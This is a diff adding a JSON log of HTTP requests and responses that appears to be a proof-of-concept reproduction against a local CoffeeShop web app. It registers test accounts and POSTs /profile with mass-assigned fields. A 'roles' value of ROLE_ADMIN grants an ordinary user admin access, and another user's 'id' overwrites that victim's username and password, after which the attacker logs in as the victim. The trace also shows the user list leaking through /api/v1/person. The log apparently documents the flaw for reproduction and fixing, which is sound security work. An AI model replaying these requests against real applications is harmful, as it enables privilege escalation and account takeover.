@@ -1,0 +1,332 @@
+[
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": null
+  },
+  {
+    "request": "POST /register",
+    "form": {
+      "username": "poc-customer",
+      "email": "poc-customer@example.test",
+      "password": "Local-repro-1",
+      "passwordConfirm": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": "JSESSIONID=8ADC295F6D55A8EB743E58CFE68ECB86; Path=/"
+  },
+  {
+    "request": "POST /login",
+    "form": {
+      "username": "poc-customer",
+      "password": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "request": "GET /persons",
+    "form": null,
+    "status": 403,
+    "final_url": "http://127.0.0.1:8082/persons",
+    "content_type": "application/json",
+    "body_excerpt": "{\"timestamp\":\"2026-10-11T10:06:27.509+00:00\",\"status\":403,\"error\":\"Forbidden\",\"path\":\"/persons\"}"
+  },
+  {
+    "request": "GET /api/v1/person",
+    "form": null,
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/api/v1/person",
+    "content_type": "application/json",
+    "body_excerpt": "[{\"id\":1,\"username\":\"Admin\",\"firstName\":\"ADMIN\",\"lastName\":\"ADMIN\",\"email\":\"Admin@admin.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_ADMIN\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":2,\"username\":\"User\",\"firstName\":\"User\",\"lastName\":\"Customer\",\"email\":\"User@customer.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_CUSTOMER\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":3,\"username"
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/profile",
+    "set_cookie": null
+  },
+  {
+    "request": "POST /profile",
+    "form": {
+      "username": "poc-customer",
+      "email": "poc-customer@example.test",
+      "password": "Local-repro-1",
+      "passwordConfirm": "Local-repro-1",
+      "firstName": "Poc",
+      "lastName": "User",
+      "phone": "",
+      "address": "1 Local St",
+      "enable": "true",
+      "profilePic": "default-profile-picture.jpg",
+      "roles": "ROLE_ADMIN",
+      "id": "67"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/profile",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n<head lang=\"en\">\n    <title>Person Profile - CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;5"
+  },
+  {
+    "request": "GET /api/v1/person",
+    "form": null,
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/api/v1/person",
+    "content_type": "application/json",
+    "body_excerpt": "[{\"id\":1,\"username\":\"Admin\",\"firstName\":\"ADMIN\",\"lastName\":\"ADMIN\",\"email\":\"Admin@admin.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_ADMIN\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":2,\"username\":\"User\",\"firstName\":\"User\",\"lastName\":\"Customer\",\"email\":\"User@customer.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_CUSTOMER\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":3,\"username"
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": "JSESSIONID=C6A4332FF83C4F316C1DC63871644144; Path=/"
+  },
+  {
+    "request": "POST /login",
+    "form": {
+      "username": "poc-customer",
+      "password": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "request": "GET /persons",
+    "form": null,
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/persons",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>Persons - CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;60"
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": null
+  },
+  {
+    "request": "POST /register",
+    "form": {
+      "username": "poc-omit",
+      "email": "poc-omit@example.test",
+      "password": "Local-repro-1",
+      "passwordConfirm": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": "JSESSIONID=CD494CE376515142DD7A225F940BE83A; Path=/"
+  },
+  {
+    "request": "POST /login",
+    "form": {
+      "username": "poc-omit",
+      "password": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/profile",
+    "set_cookie": null
+  },
+  {
+    "request": "POST /profile",
+    "form": {
+      "username": "poc-new-admin",
+      "email": "poc-new-admin@example.test",
+      "password": "Local-repro-1",
+      "passwordConfirm": "Local-repro-1",
+      "firstName": "New",
+      "lastName": "Admin",
+      "phone": "",
+      "address": "1 Local St",
+      "enable": "true",
+      "profilePic": "default-profile-picture.jpg",
+      "roles": "ROLE_ADMIN"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/profile",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n<head lang=\"en\">\n    <title>Person Profile - CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;5"
+  },
+  {
+    "request": "GET /api/v1/person",
+    "form": null,
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/api/v1/person",
+    "content_type": "application/json",
+    "body_excerpt": "[{\"id\":1,\"username\":\"Admin\",\"firstName\":\"ADMIN\",\"lastName\":\"ADMIN\",\"email\":\"Admin@admin.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_ADMIN\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":2,\"username\":\"User\",\"firstName\":\"User\",\"lastName\":\"Customer\",\"email\":\"User@customer.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_CUSTOMER\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":3,\"username"
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": "JSESSIONID=FFE4233120245C4F26009459CF23E153; Path=/"
+  },
+  {
+    "request": "POST /login",
+    "form": {
+      "username": "poc-new-admin",
+      "password": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "request": "GET /persons",
+    "form": null,
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/persons",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>Persons - CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;60"
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": null
+  },
+  {
+    "request": "POST /register",
+    "form": {
+      "username": "poc-victim",
+      "email": "poc-victim@example.test",
+      "password": "Local-repro-1",
+      "passwordConfirm": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "request": "GET /api/v1/person",
+    "form": null,
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/api/v1/person",
+    "content_type": "application/json",
+    "body_excerpt": "[{\"id\":1,\"username\":\"Admin\",\"firstName\":\"ADMIN\",\"lastName\":\"ADMIN\",\"email\":\"Admin@admin.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_ADMIN\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":2,\"username\":\"User\",\"firstName\":\"User\",\"lastName\":\"Customer\",\"email\":\"User@customer.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_CUSTOMER\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":3,\"username"
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": null
+  },
+  {
+    "request": "POST /register",
+    "form": {
+      "username": "poc-taker",
+      "email": "poc-taker@example.test",
+      "password": "Local-repro-1",
+      "passwordConfirm": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": "JSESSIONID=6B3A2CC64E197C1F9570CA1C738C7EDF; Path=/"
+  },
+  {
+    "request": "POST /login",
+    "form": {
+      "username": "poc-taker",
+      "password": "Local-repro-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/profile",
+    "set_cookie": null
+  },
+  {
+    "request": "POST /profile",
+    "form": {
+      "username": "poc-owned-victim",
+      "email": "poc-owned@example.test",
+      "password": "Owned-pass-1",
+      "passwordConfirm": "Owned-pass-1",
+      "firstName": "Owned",
+      "lastName": "Victim",
+      "phone": "",
+      "address": "1 Local St",
+      "enable": "true",
+      "profilePic": "default-profile-picture.jpg",
+      "roles": "ROLE_CUSTOMER",
+      "id": "70"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/profile",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n<head lang=\"en\">\n    <title>Person Profile - CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;5"
+  },
+  {
+    "request": "GET /api/v1/person",
+    "form": null,
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/api/v1/person",
+    "content_type": "application/json",
+    "body_excerpt": "[{\"id\":1,\"username\":\"Admin\",\"firstName\":\"ADMIN\",\"lastName\":\"ADMIN\",\"email\":\"Admin@admin.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_ADMIN\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":2,\"username\":\"User\",\"firstName\":\"User\",\"lastName\":\"Customer\",\"email\":\"User@customer.com\",\"password\":null,\"passwordConfirm\":null,\"phone\":null,\"enable\":true,\"address\":null,\"roles\":\"ROLE_CUSTOMER\",\"profilePic\":\"default-profile-picture.jpg\"},{\"id\":3,\"username"
+  },
+  {
+    "kind": "redirect",
+    "status": 302,
+    "location": "http://127.0.0.1:8082/",
+    "set_cookie": "JSESSIONID=48885830A89343266770024347B18609; Path=/"
+  },
+  {
+    "request": "POST /login",
+    "form": {
+      "username": "poc-owned-victim",
+      "password": "Owned-pass-1"
+    },
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n  <head lang=\"en\">\n    <title>CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;500;600&display="
+  },
+  {
+    "request": "GET /profile",
+    "form": null,
+    "status": 200,
+    "final_url": "http://127.0.0.1:8082/profile",
+    "content_type": "text/html;charset=UTF-8",
+    "body_excerpt": "<!DOCTYPE html>\n<html>\n<head lang=\"en\">\n    <title>Person Profile - CoffeeShop</title>\n     \n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\" />\n    <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin=\"anonymous\" />\n    <link href=\"https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&family=Inter:wght@400;5"
+  }
+]
